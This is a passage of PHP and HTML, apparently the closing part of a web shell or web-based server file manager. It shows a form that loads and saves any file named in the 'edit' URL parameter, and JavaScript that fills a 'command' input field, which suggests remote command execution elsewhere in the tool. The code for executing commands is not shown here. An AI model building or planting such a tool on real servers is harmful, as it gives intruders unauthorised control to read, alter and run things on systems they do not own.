            $editFile = $currentDir . '/' . basename($_GET['edit']);
            if (file_exists($editFile) && is_file($editFile)) {
                $content = file_get_contents($editFile);
                ?>
                <div class="tool-section" style="margin-top: 30px;">
                    <h3>✏️ EDITING: <?php echo htmlspecialchars(basename($editFile)); ?></h3>
                    <form method="post">
                        <textarea name="content" style="width: 100%; min-height: 400px; font-family: 'Courier New', monospace;"><?php echo htmlspecialchars($content); ?></textarea>
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                        <div style="margin-top: 10px;">
                            <button type="submit" name="save_file" class="btn btn-primary">💾 SAVE</button>
                            <a href="?dir=<?php echo urlencode($currentDir); ?>" class="btn">CANCEL</a>
                        </div>
                    </form>
                </div>
                <?php
            }
        }
        ?>
    </div>
    
    <script>
        function toggleAll(source) {
            document.querySelectorAll('input[name="items[]"]').forEach(cb => cb.checked = source.checked);
        }
        
        function setCommand(cmd) {
            document.querySelector('input[name="command"]').value = cmd;
            document.querySelector('input[name="command"]').focus();
        }
        
        // Auto-hide messages after 5 seconds
        setTimeout(function() {
            document.querySelectorAll('.message').forEach(el => {
                el.style.opacity = '0';
                setTimeout(() => el.style.display = 'none', 500);
            });
        }, 5000);
    </script>
</body>
</html>